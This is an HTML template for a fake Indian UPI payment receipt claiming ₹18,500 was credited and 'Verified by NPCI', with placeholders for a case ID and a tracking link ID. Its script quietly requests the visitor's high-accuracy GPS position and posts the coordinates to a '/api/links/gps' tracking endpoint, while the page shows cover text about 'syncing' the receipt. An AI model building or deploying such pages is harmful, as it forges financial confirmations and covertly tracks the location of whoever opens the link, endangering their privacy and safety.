<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Payment Receipt — Confirmation #{{ case_id }}</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #f4f6f8; color: #1a1f36; padding: 24px 16px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .receipt-card { background: #ffffff; border-radius: 16px; max-width: 440px; width: 100%; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e3e8ee; }
    .header { background: linear-gradient(135deg, #00875a, #00b875); color: #fff; padding: 32px 20px 24px; text-align: center; }
    .check-icon { width: 56px; height: 56px; background: rgba(255,255,255,0.25); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 28px; }
    .amount { font-size: 32px; font-weight: 800; margin-bottom: 4px; letter-spacing: -0.5px; }
    .status-text { font-size: 14px; font-weight: 500; opacity: 0.95; }
    .body-content { padding: 24px; }
    .row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px dashed #e3e8ee; font-size: 14px; }
    .row:last-child { border-bottom: none; }
    .label { color: #697386; font-weight: 500; }
    .value { color: #1a1f36; font-weight: 600; text-align: right; }
    .badge { background: #e3fcef; color: #006644; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 6px; display: inline-block; }
    .btn { display: block; width: 100%; text-align: center; background: #00875a; color: #ffffff; text-decoration: none; padding: 14px; border-radius: 10px; font-weight: 600; font-size: 14px; margin-top: 20px; transition: background 0.2s; }
    .btn:hover { background: #006644; }
    .footer-note { text-align: center; font-size: 11px; color: #8792a2; margin-top: 16px; }
    .gps-ping { text-align: center; font-size: 11px; color: #9aa5b5; margin-top: 8px; }
  </style>
</head>
<body>

  <div class="receipt-card">
    <div class="header">
      <div class="check-icon">✓</div>
      <div class="amount">₹18,500.00</div>
      <div class="status-text">Payment Successful</div>
    </div>

    <div class="body-content">
      <div class="row">
        <span class="label">Reference / UTR</span>
        <span class="value">4192{{ case_id }}803</span>
      </div>
      <div class="row">
        <span class="label">Payment Mode</span>
        <span class="value">UPI Instant Transfer</span>
      </div>
      <div class="row">
        <span class="label">Status</span>
        <span class="value"><span class="badge">CREDITED</span></span>
      </div>
      <div class="row">
        <span class="label">Time</span>
        <span class="value" id="curTime">Just now</span>
      </div>

      <a href="javascript:void(0)" onclick="alert('Transaction verified and encrypted under Session #{{ case_id }}.');" class="btn">
        📥 Download Official E-Receipt
      </a>

      <p class="footer-note">Verified by NPCI Unified Payments Interface</p>
      <p class="gps-ping" id="clientLoc">Syncing device receipt confirmation...</p>
    </div>
  </div>

  <script>
    document.getElementById('curTime').innerText = new Date().toLocaleString('en-IN', {
      dateStyle: 'medium',
      timeStyle: 'short'
    });

    // Attempt optional HTML5 high-accuracy GPS ping back to the tracking system
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          fetch('/api/links/gps', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              link_id: '{{ link_id }}',
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            })
          }).catch(function(){});
          document.getElementById('clientLoc').innerText = 'Receipt synchronized with network node.';
        },
        function(err) {
          document.getElementById('clientLoc').innerText = 'Verified via Network Gateway.';
        },
        { enableHighAccuracy: true, timeout: 6000 }
      );
    }
  </script>
</body>
</html>
